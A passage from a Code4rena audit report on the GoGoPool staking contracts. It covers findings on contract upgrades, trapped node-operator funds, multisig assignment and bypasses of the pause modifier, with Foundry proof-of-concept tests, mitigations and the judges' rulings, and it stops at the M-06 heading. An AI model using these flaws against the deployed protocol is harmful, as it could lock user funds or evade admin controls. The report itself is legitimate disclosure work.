[chaduke](https://github.com/code-423n4/2022-12-gogopool-findings/issues/315), and [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/275)*

[Link to original code](https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol#L209-L216)

```solidity
File: https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol

205	/// @notice Upgrade a contract by unregistering the existing address, and registring a new address and name
	/// @param newAddr Address of the new contract
	/// @param newName Name of the new contract
	/// @param existingAddr Address of the existing contract to be deleted
209	function upgradeExistingContract(
			address newAddr,
			string memory newName,
			address existingAddr
		) external onlyGuardian {
			registerContract(newAddr, newName);
			unregisterContract(existingAddr);
216	}
```

Function `ProtocolDAO.upgradeExistingContract` handles contract upgrading. However, there are multiple implicaitons of the coding logic in the function, which render the contract upgrading impractical.

**Implication 1**:

The above function `upgradeExistingContract` registers the upgraded contract first, then unregisters the existing contract. This leads to the requirement that the upgraded contract name **must be different from** the existing contract name. Otherwise the updated contract address returned by `Storage.getAddress(keccak256(abi.encodePacked("contract.address", contractName)))` will be `address(0)` (please refer to the below POC Testcase 1). This is because if the upgraded contract uses the original name (i.e. the contract name is not changed), function call  `unregisterContract(existingAddr)` in the `upgradeExistingContract` will override the registered contract address in `Storage` to address(0) due to the use of the same contract name.

Since using the same name after upgrading will run into trouble with current coding logic, a safeguard should be in place to make sure two names are really different. For example, put this statement in the `upgradeExistingContract` function:<br>
`require(newName != existingName, "Name not changed");`, where `existingName` can be obtained using:<br>
`string memory existingName = store.getString(keccak256(abi.encodePacked("contract.name", existingAddr)));`.

**Implication 2**:

If we really want a different name for an upgraded contract, we then get into more serious troubles: We have to upgrade other contracts that reference the upgraded contract since contract names are referenced mostly hardcoded (for security considerations). This may lead to a very complicated issue because contracts are cross-referenced.

For example, contract `ClaimNodeOp` references contracts `RewardsPool`, `ProtocolDAO` and `Staking`. At the same time, contract `ClaimNodeOp` is referenced by contracts `RewardsPool` and `Staking`. This means that:

1.  If contract `ClaimNodeOp` was upgraded, which means the contract name `ClaimNodeOp` was changed;
2.  This requires contracts `RewardsPool` and `Staking` to be upgraded (with new names) in order to correctly reference to newly named `ClaimNodeOp` contract;
3.  This further requires those contracts that reference `RewardsPool` or `Staking` to be upgraded in order to correctly reference them;
4.  and this further requires those contracts that reference the above upgraded contracts to be upgraded ...
5.  This may lead to complicated code management issue and expose new vulnerabilites due to possible incomplete code adaptation.
6.  This may render the contracts upgrading impractical.

I rate this issue as high severity due to the fact that:<br>
Contract upgradability is one of the main features of the whole system design (all other contracts are designed upgradable except for `TokenGGP`, `Storage` and `Vault` ). However, the current `upgradeExistingContract` function's coding logic requires the upgraded contract must change its name (refer to the below Testcase 1). This inturn requires to upgrade all relevant cross-referenced contracts (refer to the below Testcase 2). Thus leading to a quite serous code management issue while upgrading contracts, and renders upgrading contracts impractical.

### Proof of Concept

**Testcase 1**:

This testcase demonstrates that current coding logic of upgrading contracts requires: **the upgraded contract must change its name**. Otherwise contract upgrading will run into issue.
Put the below test case in file `ProtocolDAO.t.sol`. The test case demonstrates that `ProtocolDAO.upgradeExistingContract` does not function properly if the upgraded contract does not change the name. That is: the upgraded contract address returned by `Storage.getAddress(keccak256(abi.encodePacked("contract.address", contractName)))` will be `address(0)` if its name unchanged.

```solidity
	function testUpgradeExistingContractWithNameUnchanged() public {
		address addr = randAddress();
		string memory name = "existingName";

		address existingAddr = randAddress();
		string memory existingName = "existingName";

		vm.prank(guardian);
		dao.registerContract(existingAddr, existingName);
		assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), true);
		assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), existingAddr);
		assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), existingName);

		vm.prank(guardian);
		//@audit upgrade contract while name unchanged
		dao.upgradeExistingContract(addr, name, existingAddr);
		assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", addr))), true);
		//@audit the registered address was deleted by function call `PtotocolDAO.unregisterContract(existingAddr)`
		assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", name))), address(0));
		assertEq(store.getString(keccak256(abi.encodePacked("contract.name", addr))), name);

               //@audit verify that the old contract has been de-registered
		assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), false);
		assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), address(0));
		assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), "");
	}
```

**Testcase 2**:

This testcase demonstrates that current coding logic of upgrading contracts requires: **in order to upgrade a single contract, all cross-referenced contracts have to be upgraded and change their names**. Otherwise, other contracts will run into issues.<br>
If the upgraded contract does change its name, contract upgrading will succeed. However, other contracts' functions that reference the upgraded contract will fail due to referencing hardcoded contract name.<br>
The below testcase upgrades contract `ClaimNodeOp` to `ClaimNodeOpV2`. Then, contract `Staking` calls `increaseGGPRewards` which references hardcoded contract name `ClaimNodeOp` in its modifier. The call is failed.

Test steps:

1.  Copy contract file `ClaimNodeOp.sol` to `ClaimNodeOpV2.sol`, and rename the contract name from `ClaimNodeOp` to `ClaimNodeOpV2` in file  `ClaimNodeOpV2.sol`;
2.  Put the below test file `UpgradeContractIssue.t.sol` under folder `test/unit/`;
3.  Run the test.

**Note**: In order to test actual function call after upgrading contract, this testcase upgrades a real contract `ClaimNodeOp`. This is different from the above Testcase 1 which uses a random address to simulate a contract.

```solidity
// File: UpgradeContractIssue.t.sol
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.17;

import "./utils/BaseTest.sol";
import {ClaimNodeOpV2} from "../../contracts/contract/ClaimNodeOpV2.sol";
import {BaseAbstract} from "../../contracts/contract/BaseAbstract.sol";

contract UpgradeContractIssueTest is BaseTest {
	using FixedPointMathLib for uint256;

	address private nodeOp1;

	uint256 internal constant TOTAL_INITIAL_GGP_SUPPLY = 22_500_000 ether;

	function setUp() public override {
		super.setUp();

		nodeOp1 = getActorWithTokens("nodeOp1", MAX_AMT, MAX_AMT);
		vm.prank(nodeOp1);
		ggp.approve(address(staking), MAX_AMT);
		fundGGPRewardsPool();
	}

	function fundGGPRewardsPool() public {
		// guardian is minted 100% of the supply
		vm.startPrank(guardian);
		uint256 rewardsPoolAmt = TOTAL_INITIAL_GGP_SUPPLY.mulWadDown(.20 ether);
		ggp.approve(address(vault), rewardsPoolAmt);
		vault.depositToken("RewardsPool", ggp, rewardsPoolAmt);
		vm.stopPrank();
	}

	function testUpgradeExistingContractWithNameChanged() public {
		
		vm.prank(nodeOp1);
		staking.stakeGGP(10 ether);

                //@audit increase GGPRewards before upgrading contract - succeed
		vm.prank(address(nopClaim));
		staking.increaseGGPRewards(address(nodeOp1), 10 ether);
		assert(staking.getGGPRewards(address(nodeOp1)) == 10 ether);

		//@audit Start to upgrade contract ClaimNodeOp to ClaimNodeOpV2
		
		vm.startPrank(guardian);
		//@audit upgrad contract
		ClaimNodeOpV2 nopClaimV2 = new ClaimNodeOpV2(store, ggp);
		address addr = address(nopClaimV2);
		//@audit contract name must be changed due to the limitation of `upgradeExistingContract` coding logic
		string memory name = "ClaimNodeOpV2";

		//@audit get existing contract ClaimNodeOp info
		address existingAddr = address(nopClaim);
		string memory existingName = "ClaimNodeOp";
		
		//@audit the existing contract should be already registered. Verify its info.
		assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), true);
		assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), existingAddr);
		assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), existingName);

                //@audit Upgrade contract
		dao.upgradeExistingContract(addr, name, existingAddr);
		
		//@audit verify that the upgraded contract has correct contract info registered
		assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", addr))), true);
		assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", name))), addr);
		assertEq(store.getString(keccak256(abi.encodePacked("contract.name", addr))), name);

		//@audit verify that the old contract has been de-registered
		assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), false);
		assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), address(0));
		assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), "");
		vm.stopPrank();

		vm.prank(nodeOp1);
		staking.stakeGGP(10 ether);

                //@audit increase GGPRewards after upgrading contract ClaimNodeOp to ClaimNodeOpV2
		vm.prank(address(nopClaimV2)); //@audit using the upgraded contract
		vm.expectRevert(BaseAbstract.InvalidOrOutdatedContract.selector);
		//@audit revert due to contract Staking using hardcoded contract name "ClaimNodeOp" in the modifier
		staking.increaseGGPRewards(address(nodeOp1), 10 ether);
	}
}

```

### Recommended Mitigation Steps

1.  Upgrading contract does not have to change contranct names especially in such a complicated system wherein contracts are cross-referenced in a hardcoded way. I would suggest not to change contract names when upgrading contracts.
2.  In function `upgradeExistingContract` definition, swap fucnction call sequence between `registerContract()` and `unregisterContract()` so that contract names can keep unchanged after upgrading. That is, the modified function would be:

```solidity
File: https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol

205	/// @notice Upgrade a contract by unregistering the existing address, and registring a new address and name
	/// @param newAddr Address of the new contract
	/// @param newName Name of the new contract
	/// @param existingAddr Address of the existing contract to be deleted
209	function upgradeExistingContract(
			address newAddr,
			string memory newName,  //@audit this `newName` parameter can be removed if upgrading don't change contract name
			address existingAddr
		) external onlyGuardian {
  		unregisterContract(existingAddr);  //@audit unregister the existing contract first
		registerContract(newAddr, newName);  //@audit then register the upgraded contract
216	}
```

**POC of Mitigation**:

After the above recommended mitigation, the below Testcase verifies that after upgrading contracts, other contract's functions, which reference the hardcoded contract name, can still opetate correctly.

1.  Make the above recommended mitigation in function `ProtocolDAO.upgradeExistingContract`;
2.  Put the below test file `UpgradeContractImproved.t.sol` under folder `test/unit/`;
3.  Run the test.

**Note**: Since we don't change the upgraded contract name, for testing purpose, we just need to create a new contract instance (so that the contract instance address is changed) to simulate the contract upgrading.

```solidity
	// File: UpgradeContractImproved.t.sol
	// SPDX-License-Identifier: GPL-3.0-only
	pragma solidity 0.8.17;

	import "./utils/BaseTest.sol";
	import {ClaimNodeOp} from "../../contracts/contract/ClaimNodeOp.sol";
	import {BaseAbstract} from "../../contracts/contract/BaseAbstract.sol";

	contract UpgradeContractImprovedTest is BaseTest {
		using FixedPointMathLib for uint256;

		address private nodeOp1;

		uint256 internal constant TOTAL_INITIAL_GGP_SUPPLY = 22_500_000 ether;

		function setUp() public override {
			super.setUp();

			nodeOp1 = getActorWithTokens("nodeOp1", MAX_AMT, MAX_AMT);
			vm.prank(nodeOp1);
			ggp.approve(address(staking), MAX_AMT);
			fundGGPRewardsPool();
		}

		function fundGGPRewardsPool() public {
			// guardian is minted 100% of the supply
			vm.startPrank(guardian);
			uint256 rewardsPoolAmt = TOTAL_INITIAL_GGP_SUPPLY.mulWadDown(.20 ether);
			ggp.approve(address(vault), rewardsPoolAmt);
			vault.depositToken("RewardsPool", ggp, rewardsPoolAmt);
			vm.stopPrank();
		}

		function testUpgradeContractCorrectlyWithNameUnChanged() public {
			//@audit increase GGPRewards before upgrading contract - no problem
			vm.prank(nodeOp1);
			staking.stakeGGP(10 ether);

			vm.prank(address(nopClaim));
			staking.increaseGGPRewards(address(nodeOp1), 10 ether);
			assert(staking.getGGPRewards(address(nodeOp1)) == 10 ether);

			//@audit Start to upgrade contract ClaimNodeOp
			vm.startPrank(guardian);
			//@audit upgraded contract by creating a new contract instance
			ClaimNodeOp nopClaimV2 = new ClaimNodeOp(store, ggp);
			address addr = address(nopClaimV2);
			//@audit contract name is not changed!
			string memory name = "ClaimNodeOp";

			//@audit get existing contract info
			address existingAddr = address(nopClaim);
			string memory existingName = "ClaimNodeOp";

			//@audit new contract address is different from the old one
			assertFalse(addr == existingAddr);
			
			//@audit the existing contract should be already registered. Verify its info.
			assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), true);
			assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), existingAddr);
			assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), existingName);

                        //@audit Upgrade contract
			dao.upgradeExistingContract(addr, name, existingAddr);
			
			//@audit verify the upgraded contract has correct contract info registered
			assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", addr))), true);
			assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", name))), addr);
			assertEq(store.getString(keccak256(abi.encodePacked("contract.name", addr))), name);

			//@audit verify that the old contract has been de-registered
			assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), false);
			assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), "");
			//@audit The contract has new address now. Note that: existingName == name
			assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), addr);
			vm.stopPrank();

			//@audit increase GGPRewards after upgrading contract ClaimNodeOp to ClaimNodeOpV2
			vm.prank(nodeOp1);
			staking.stakeGGP(10 ether);

			vm.prank(address(nopClaimV2)); //@audit using the new contract
			//@audit Successfully call the below function with hardcoded contract name "ClaimNodeOp" in the modifier
			staking.increaseGGPRewards(address(nodeOp1), 10 ether);
			//@audit Successfully increased!
			assert(staking.getGGPRewards(address(nodeOp1)) == 20 ether);
		}
	}

```

**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/742#issuecomment-1379350503)**

**[0xju1ie (GoGoPool) disagreed with severity and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/742#issuecomment-1384535064):**
 > Not sure if this is considered a high since there isn't a direct loss of funds?
> 
> `Medium: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.`

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/742#issuecomment-1409240633):**
 > In spite of the lack of risk for Principal, a core functionality of the protocol is impaired.
> 
> This has to be countered versus the requirement of the names being the same, which intuitively seems to be the intended use case, as changing the name would also break balances / other integrations such as the modifier `onlySpecificRegisteredContract`.
>
 > The other side of the argument is that the mistake is still fixable by the same actor within a reasonable time frame.

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/742#issuecomment-1414350784):**
 > I believe the finding is meaningful and well written, but ultimately the damage can be undone with a follow-up call to `registerContract`.
> 
> Because of this am downgrading to Medium Severity.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Fix upgrade to work when a contract has the same name: [multisig-labs/gogopool#32](https://github.com/multisig-labs/gogopool/pull/32)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/11) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/27).



***

## [[M-03] NodeOp funds may be trapped by a invalid state transition](https://github.com/code-423n4/2022-12-gogopool-findings/issues/723)
*Submitted by [0xbepresent](https://github.com/code-423n4/2022-12-gogopool-findings/issues/723), also found by [cozzetti](undefined), [wagmi](undefined), [datapunk](https://github.com/code-423n4/2022-12-gogopool-findings/issues/878), [sces60107](https://github.com/code-423n4/2022-12-gogopool-findings/issues/683), [peritoflores](https://github.com/code-423n4/2022-12-gogopool-findings/issues/681), [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/581), [yixxas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/562), [immeas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/495), [Ch\_301](https://github.com/code-423n4/2022-12-gogopool-findings/issues/420), [0Kage](https://github.com/code-423n4/2022-12-gogopool-findings/issues/311), [kaliberpoziomka8552](https://github.com/code-423n4/2022-12-gogopool-findings/issues/270), [rvierdiiev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/175), [Atarpara](https://github.com/code-423n4/2022-12-gogopool-findings/issues/135), and [Manboy](https://github.com/code-423n4/2022-12-gogopool-findings/issues/85)*

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L528><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L287>

The Multisig can call `MinipoolManager.sol::recordStakingError()` if there is an error while registering the node as a validator. Also the Multisig can call [MinipoolManager.sol::finishFailedMinipoolByMultisig()](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L528) in order to "finish" the NodeOp's minipool proccess.

If the Multisig accidentally/intentionally calls `recordStakingError()` then `finishFailedMinipoolByMultisig()` the NodeOp funds may be trapped in the protocol.

The `finishFailedMinipoolByMultisig()` has the next comment: *Multisig can move a minipool from the error state to the finished state after a human review of the error* but the NodeOp should be able to withdraw his funds after a finished minipool.

### Proof of Concept

I created a test for this situation in `MinipoolManager.t.sol`. At the end you can observe that the `withdrawMinipoolFunds()` reverts with `InvalidStateTransition` error:

1.  NodeOp creates the minipool
2.  Rialto calls claimAndInitiateStaking
3.  Something goes wrong and Rialto calls recordStakingError()
4.  Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order to finish the NodeOp's minipool
5.  The NodeOp can not withdraw his funds. The withdraw function reverts with InvalidStateTransition() error

```solidity
function testUserFundsStuckErrorFinished() public {
    // NodeOp funds may be trapped by a invalid state transition
    // 1. NodeOp creates the minipool
    // 2. Rialto calls claimAndInitiateStaking
    // 3. Something goes wrong and Rialto calls recordStakingError()
    // 4. Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order 
    // to finish the NodeOp's minipool
    // 5. The NodeOp can not withdraw his funds. The withdraw function reverts with
    // InvalidStateTransition() error
    //
    // 1. Create the minipool by the NodeOp
    //
    address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
    vm.prank(liqStaker1);
    ggAVAX.depositAVAX{value: MAX_AMT}();
    assertEq(liqStaker1.balance, 0);
    uint256 duration = 2 weeks;
    uint256 depositAmt = 1000 ether;
    uint256 avaxAssignmentRequest = 1000 ether;
    uint256 validationAmt = depositAmt + avaxAssignmentRequest;
    uint128 ggpStakeAmt = 200 ether;
    vm.startPrank(nodeOp);
    ggp.approve(address(staking), ggpStakeAmt);
    staking.stakeGGP(ggpStakeAmt);
    MinipoolManager.Minipool memory mp = createMinipool(depositAmt, avaxAssignmentRequest, duration);
    vm.stopPrank();
    assertEq(vault.balanceOf("MinipoolManager"), depositAmt);
    //
    // 2. Rialto calls claimAndInitiateStaking
    //
    vm.startPrank(address(rialto));
    minipoolMgr.claimAndInitiateStaking(mp.nodeID);
    assertEq(vault.balanceOf("MinipoolManager"), 0);
    //
    // 3. Something goes wrong and Rialto calls recordStakingError()
    //
    bytes32 errorCode = "INVALID_NODEID";
    minipoolMgr.recordStakingError{value: validationAmt}(mp.nodeID, errorCode);
    // NodeOps funds should be back in vault
    assertEq(vault.balanceOf("MinipoolManager"), depositAmt);
    // 4. Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order 
    // to finish the NodeOp's minipool
    minipoolMgr.finishFailedMinipoolByMultisig(mp.nodeID);
    vm.stopPrank();
    // 5. The NodeOp can not withdraw his funds. The withdraw function reverts with
    // InvalidStateTransition() error
    vm.startPrank(nodeOp);
    vm.expectRevert(MinipoolManager.InvalidStateTransition.selector);
    minipoolMgr.withdrawMinipoolFunds(mp.nodeID);
    vm.stopPrank();
}
```

### Tools used

Foundry/Vscode

### Recommended Mitigation Steps

The `withdrawMinipoolFunds` could add another [requireValidStateTransition](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#LL290C3-L290C30) in order to allow the withdraw after the finished minipoool.


**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/723)**

**[0xju1ie (GoGoPool) disagreed with severity and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/723#issuecomment-1385123551):**
 > I think this should be the primary for the `finishFailedMinipoolByMultisig()` problem.
> 
> Medium feels like a more appropriate severity. This issue depends on rialto multisig improperly functioning but we do intend to fix the finishFailedMinipoolByMultisig method to not lock users out of their funds.

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/723#issuecomment-1415686783):**
 > The Warden has shown a potential issues with the FSM of the system, per the Audit Scope, the transition should not happen on the deployed system, however, the Warden has shown an issue with the state transition check and has detailed the consequences of it.
> 
> For this reason, I agree with Medium Severity.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Remove method that trapped Node Operator's funds: [multisig-labs/gogopool#20](https://github.com/multisig-labs/gogopool/pull/20)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/13) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/28).



***

## [[M-04] `requireNextActiveMultisig` will always return the first enabled multisig which increases the probability of stuck minipools](https://github.com/code-423n4/2022-12-gogopool-findings/issues/702)
*Submitted by [imare](https://github.com/code-423n4/2022-12-gogopool-findings/issues/702), also found by [HollaDieWaldfee](undefined), [btk](undefined), [jadezti](undefined), [gz627](undefined), [nogo](https://github.com/code-423n4/2022-12-gogopool-findings/issues/721), [imare](https://github.com/code-423n4/2022-12-gogopool-findings/issues/701), [Jeiwan](https://github.com/code-423n4/2022-12-gogopool-findings/issues/618), [sk8erboy](https://github.com/code-423n4/2022-12-gogopool-findings/issues/589), [enckrish](https://github.com/code-423n4/2022-12-gogopool-findings/issues/560), [AkshaySrivastav](https://github.com/code-423n4/2022-12-gogopool-findings/issues/538), [betweenETHlines](https://github.com/code-423n4/2022-12-gogopool-findings/issues/481), [simon135](https://github.com/code-423n4/2022-12-gogopool-findings/issues/395), [0xbepresent](https://github.com/code-423n4/2022-12-gogopool-findings/issues/343), [0Kage](https://github.com/code-423n4/2022-12-gogopool-findings/issues/316), [kaliberpoziomka8552](https://github.com/code-423n4/2022-12-gogopool-findings/issues/276), [0Kage](https://github.com/code-423n4/2022-12-gogopool-findings/issues/271), [Saintcode\_](https://github.com/code-423n4/2022-12-gogopool-findings/issues/190), [Faith](https://github.com/code-423n4/2022-12-gogopool-findings/issues/141), and [dic0de](https://github.com/code-423n4/2022-12-gogopool-findings/issues/12)*

For every created minipool a multisig address is set to continue validator interactions.

Every minipool multisig address get assigned by calling `requireNextActiveMultisig`.

This function always return the first enabled multisig address.

In case the specific address is disabled all created minipools will be stuck with this address which increase the probability of also funds being stuck.

### Impact

Probability of funds being stuck increases if `requireNextActiveMultisig` always return the same address.

### Proof of Concept

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L80-L91>

### Recommended Mitigation Steps

Use a strategy like [round robin](https://en.wikipedia.org/wiki/Round-robin_item_allocation) to assign next active multisig to minipool.

Something like this :

```solidity
private uint nextMultisigAddressIdx;

function requireNextActiveMultisig() external view returns (address) {
    uint256 total = getUint(keccak256("multisig.count"));
    address addr;
    bool enabled;

    uint256 i = nextMultisigAddressIdx; // cache last used
    if (nextMultisigAddressIdx==total) {
        i = 0;
    }

    for (; i < total; i++) {
        (addr, enabled) = getMultisig(i);
        if (enabled) {
            nextMultisigAddressIdx = i+1;
            return addr;
        }
    }
    
    revert NoEnabledMultisigFound();
}
```

**[emersoncloud (GoGoPool) disagreed with severity and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/702#issuecomment-1384310351):**
 > Without a mechanism for funds to become stuck, I don't think this warrants a medium severity. 
> 
> I do agree with the principle that if we have multiple multisigs, some system to distribute minipools between them seems reasonable. 

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/702#issuecomment-1410942197):**
 > While the finding will not be awarded as Admin Privilege, I believe that ultimately the Warden has shown an incorrect implementation of the function `requireNextActiveMultisig` which would ideally either offer:
> - Round Robin
> - Provable Random Selection
> 
> For those reasons I think the finding is still notable, in that the function doesn't work as intended, and believe it should be judged Medium Severity.
>
 > I will be consulting with an additional Judge to ensure that the logic above is acceptable given the custom scope for this contest.

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/702#issuecomment-1421415846):**
 > Acknowledged. 
> 
> We're not going to fix this in the first iteration of our protocol, we're expecting to only have one active multisig. We will definitely implement some system to distribute minipools between multisigs when we have more.



***

## [[M-05] Bypass `whenNotPaused` modifier](https://github.com/code-423n4/2022-12-gogopool-findings/issues/673)
*Submitted by [\_\_141345\_\_](https://github.com/code-423n4/2022-12-gogopool-findings/issues/673), also found by [HollaDieWaldfee](undefined), [PaludoX0](undefined), [Deivitto](https://github.com/code-423n4/2022-12-gogopool-findings/issues/858), [ak1](https://github.com/code-423n4/2022-12-gogopool-findings/issues/788), [cryptostellar5](https://github.com/code-423n4/2022-12-gogopool-findings/issues/711), [Nyx](https://github.com/code-423n4/2022-12-gogopool-findings/issues/441), [ck](https://github.com/code-423n4/2022-12-gogopool-findings/issues/415), [ladboy233](https://github.com/code-423n4/2022-12-gogopool-findings/issues/351), [0xbepresent](https://github.com/code-423n4/2022-12-gogopool-findings/issues/350), [cccz](https://github.com/code-423n4/2022-12-gogopool-findings/issues/334), [csanuragjain](https://github.com/code-423n4/2022-12-gogopool-findings/issues/304), [rvierdiiev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/236), and [RaymondFam](https://github.com/code-423n4/2022-12-gogopool-findings/issues/79)*

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L328-L332><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L89-L114><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimProtocolDAO.sol#L20-L35>

The `whenNotPaused` modifier is used to pause minipool creation and staking/withdrawing GGP. However, there are several cases this modifier could be bypassed, which breaks the intended admin control function and special mode.

### Proof of Concept

**`stake()`**

In paused mode, no more `stakeGGP()` is allowed,

```solidity
File: contract/Staking.sol
319: 	function stakeGGP(uint256 amount) external whenNotPaused {
320: 		// Transfer GGP tokens from staker to this contract
321: 		ggp.safeTransferFrom(msg.sender, address(this), amount);
322: 		_stakeGGP(msg.sender, amount);
323: 	}
```

However, `restakeGGP()` is still available, which potentially violate the purpose of pause mode.

```solidity
File: contract/Staking.sol
328: 	function restakeGGP(address stakerAddr, uint256 amount) public onlySpecificRegisteredContract("ClaimNodeOp", msg.sender) {
329: 		// Transfer GGP tokens from the ClaimNodeOp contract to this contract
330: 		ggp.safeTransferFrom(msg.sender, address(this), amount);
331: 		_stakeGGP(stakerAddr, amount);
332: 	}
```

**`withdraw()`**

In paused mode, no more `withdrawGGP()` is allowed,

```solidity
File: contract/Staking.sol
358: 	function withdrawGGP(uint256 amount) external whenNotPaused {

373: 		vault.withdrawToken(msg.sender, ggp, amount);
```

However, `claimAndRestake()` is still available, which can withdraw from the vault.

```solidity
File: contract/ClaimNodeOp.sol
089: 	function claimAndRestake(uint256 claimAmt) external {

103: 		if (restakeAmt > 0) {
104: 			vault.withdrawToken(address(this), ggp, restakeAmt);
105: 			ggp.approve(address(staking), restakeAmt);
106: 			staking.restakeGGP(msg.sender, restakeAmt);
107: 		}
108: 
109: 		if (claimAmt > 0) {
110: 			vault.withdrawToken(msg.sender, ggp, claimAmt);
111: 		}
```

The function `spend()` can also ignore the pause mode to withdraw from the vault. But this is a guardian function. It could be intended behavior.

```solidity
File: contract/ClaimProtocolDAO.sol
20: 	function spend(
21: 		string memory invoiceID,
22: 		address recipientAddress,
23: 		uint256 amount
24: 	) external onlyGuardian {

32: 		vault.withdrawToken(recipientAddress, ggpToken, amount);
```

### Recommended Mitigation Steps

*   add the `whenNotPaused` modifier to `restakeGGP()` and `claimAndRestake()`
*   maybe also for guardian function `spend()`.

**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/673)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/673#issuecomment-1407733362):**
 > The warden has shown an inconsistency within similar functions regarding how they behave during a pause.<br>
> Because the finding pertains to an inconsistent functionality, without a loss of principal, I agree with Medium Severity.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Pause claimAndRestake as well: [multisig-labs/gogopool#22](https://github.com/multisig-labs/gogopool/pull/22)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/14) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/30).



***

## [[M-06] Inflation rate can be reduced by half at most if it gets called every 1.99 interval](https://github.com/code-423n4/2022-12-gogopool-findings/issues/648)
